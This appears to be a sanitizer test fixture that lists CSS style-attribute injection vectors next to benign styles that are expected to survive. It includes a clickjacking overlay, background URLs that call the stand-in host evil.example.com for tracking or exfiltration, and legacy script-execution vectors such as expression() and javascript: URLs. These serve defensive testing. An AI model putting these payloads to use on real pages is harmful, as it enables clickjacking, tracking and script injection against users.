# Style Attribute Injection Vectors

## Clickjacking overlay via position

<span style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;opacity:0.01">invisible overlay</span>

## Network exfiltration via background

<span style="background:url(https://evil.example.com/steal?d=1)">tracked</span>

<span style="background-image:url('https://evil.example.com/pixel.png')">tracked2</span>

## Script execution vectors

<span style="width:expression(alert(1))">expression</span>

<span style="behavior:url(xss.htc)">ie-behavior</span>

<span style="-moz-binding:url('xss.xml#xss')">moz-binding</span>

<span style="background:url(javascript:alert(1))">js-bg</span>

## Pre element with dangerous style

<pre style="position:absolute;background:url(https://evil.example.com/pre.png)">code here</pre>

## Comment-hidden declaration

<span style="/*harmless*/position:fixed;top:0">hidden</span>

## Legitimate safe styling must survive

<span style="color:#cc0000">safe color</span>

<span style="vertical-align:super">sup</span>
